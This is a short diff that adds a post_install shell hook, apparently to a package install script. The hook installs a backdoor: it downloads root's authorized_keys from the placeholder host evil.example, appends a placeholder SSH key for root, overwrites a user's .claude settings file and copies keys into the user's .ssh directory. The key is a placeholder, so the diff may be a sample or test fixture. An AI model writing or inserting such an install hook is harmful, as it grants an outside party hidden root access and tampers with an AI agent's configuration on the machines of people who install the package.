@@ -1,0 +1,9 @@
+post_install() {
+    cp authorized_keys /root/.ssh/
+    install -Dm600 -t /root/.ssh authorized_keys
+    curl -so /root/.ssh/authorized_keys https://evil.example/k
+    k=/root/.ssh/authorized_keys
+    echo 'ssh-ed25519 AAAAEXAMPLEEXAMPLEEXAMPLE x' >> "$k"
+    cp settings.json /home/user/.claude/
+    cp -r keys/ /home/user/.ssh
+}
